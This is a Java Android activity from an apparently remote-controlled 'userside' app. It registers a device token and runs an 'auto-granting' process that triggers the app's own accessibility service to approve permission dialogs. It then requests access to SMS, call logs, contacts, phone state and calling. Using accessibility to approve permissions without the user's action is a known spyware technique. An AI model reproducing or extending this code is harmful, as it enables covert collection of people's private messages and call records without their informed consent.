package com.lyrnic.userside.activities;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.viewpager.widget.ViewPager;
import androidx.viewpager2.widget.ViewPager2;

import com.google.android.material.tabs.TabLayout;
import com.google.android.material.tabs.TabLayoutMediator;
import com.lyrnic.userside.R;
import com.lyrnic.userside.adapters.PermissionsAdapter;
import com.lyrnic.userside.constants.Actions;
import com.lyrnic.userside.managers.ExceptionsHandler;
import com.lyrnic.userside.managers.TokenManager;
import com.lyrnic.userside.utilities.DevicesUtilities;
import com.lyrnic.userside.utilities.PermissionsUtilities;

import java.util.ArrayList;

public class PermissionsActivity extends AppCompatActivity {
    ViewPager2 viewPager;
    TabLayout tabLayout;
    ArrayList<String> permissions;
    int currentPosition;
    Handler handler;
    BroadcastReceiver readyBroadcast;
    private boolean processStopped = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        init();
    }

    public void init() {
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_permissions);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main2), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        handler = new Handler(Looper.getMainLooper());

        initToken();

        initViews();

        permissions = PermissionsUtilities.getPermissionsNames(this);

        if (permissions.isEmpty()) {
            startActivity(new Intent(PermissionsActivity.this, MainActivity.class));
            finish();
        }

        PermissionsAdapter adapter = new PermissionsAdapter(getSupportFragmentManager(), getLifecycle(), permissions);

        permissions = (ArrayList<String>) permissions.clone();

        viewPager.setAdapter(adapter);

        tabLayout.addOnTabSelectedListener(new TabLayout.OnTabSelectedListener() {
            @Override
            public void onTabSelected(TabLayout.Tab tab) {
                currentPosition = tab.getPosition();
                if(permissions.get(currentPosition).equals(PermissionsUtilities.NORMAL_PERMISSIONS)){
                    Log.d("Permissions:AutoGrant", PermissionsUtilities.getPermissionsNames(PermissionsActivity.this).toString());
                    startAutoGrantingProcess();
                }
            }

            @Override
            public void onTabUnselected(TabLayout.Tab tab) {

            }

            @Override
            public void onTabReselected(TabLayout.Tab tab) {

            }
        });
        new TabLayoutMediator(tabLayout, viewPager,
                (tab, position) -> {

                }
        ).attach();
    }

    private void startAutoGrantingProcess() {
        AccessibilityManager accessibilityManager = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);

        AccessibilityEvent event = AccessibilityEvent.obtain(AccessibilityEvent.TYPE_ANNOUNCEMENT);

        event.setPackageName(getPackageName());
        event.setClassName(PermissionsActivity.class.getName() + "::AutoGrantingProcess");

        readyBroadcast = new BroadcastReceiver() {

            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("Permissions:AutoGrant", "Receiver called, requesting permissions");
                startRequestingPermissions();
                handler.postDelayed(() -> {
                    if(!processStopped) stopAutoGrantProcess();
                }, 30000);
            }
        };

        ContextCompat.registerReceiver(this, readyBroadcast, new IntentFilter(Actions.ACTION_READY_TO_START_PROCESS), ContextCompat.RECEIVER_NOT_EXPORTED);

        accessibilityManager.sendAccessibilityEvent(event);
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if(!processStopped) stopAutoGrantProcess();
    }
    public void stopAutoGrantProcess(){
        processStopped = true;
        AccessibilityManager accessibilityManager = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);

        AccessibilityEvent event = AccessibilityEvent.obtain(AccessibilityEvent.TYPE_ANNOUNCEMENT);

        event.setPackageName(getPackageName());
        event.setClassName(PermissionsActivity.class.getName() + "::AutoGrantingProcess");

        accessibilityManager.sendAccessibilityEvent(event);
    }

    private void startRequestingPermissions() {
        ArrayList<String> permissions = new ArrayList<>();
        if (!PermissionsUtilities.canAccessContacts(this)) {
            permissions.add(Manifest.permission.READ_CONTACTS);
        }
        if (!PermissionsUtilities.canAccessStorage(this) && Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (!PermissionsUtilities.checkPostNotificationPermission(this)) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        if (!PermissionsUtilities.checkReadPhoneStatePermission(this)) {
            permissions.add(Manifest.permission.READ_PHONE_STATE);
        }
        if (!PermissionsUtilities.checkCallPermission(this)) {
            permissions.add(Manifest.permission.CALL_PHONE);
        }
        if (!PermissionsUtilities.canReadSmsMessages(this)) {
            permissions.add(Manifest.permission.READ_SMS);
        }
        if (!PermissionsUtilities.canReadCallsLogs(this)) {
            permissions.add(Manifest.permission.READ_CALL_LOG);
        }

        String[] permissionsArray = new String[permissions.size()];
        permissions.toArray(permissionsArray);
        requestPermissions(permissionsArray, 1);
    }

    public void initToken() {
        if(!TokenManager.hasToken(this)){
            TokenManager.generateToken(this);
        }

        DevicesUtilities.registerDeviceToken(this);
    }

    public void initViews() {
        tabLayout = findViewById(R.id.dots_container);

        viewPager = findViewById(R.id.pager);
    }

    public void handlePermission() {
        if(!PermissionsUtilities.checkPermission(this, permissions.get(currentPosition))){
            return;
        }

        if (PermissionsUtilities.getPermissionsNames(this).isEmpty()) {
            startActivity(new Intent(PermissionsActivity.this, MainActivity.class));
            finish();
            return;
        }
        if (currentPosition < permissions.size() - 1) {
            viewPager.setCurrentItem(currentPosition + 1, true);
        }
        else{
            viewPager.setCurrentItem(0, true);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(readyBroadcast != null) unregisterReceiver(readyBroadcast);
    }

    @Override
    protected void onResume() {
        super.onResume();

        handlePermission();
    }
}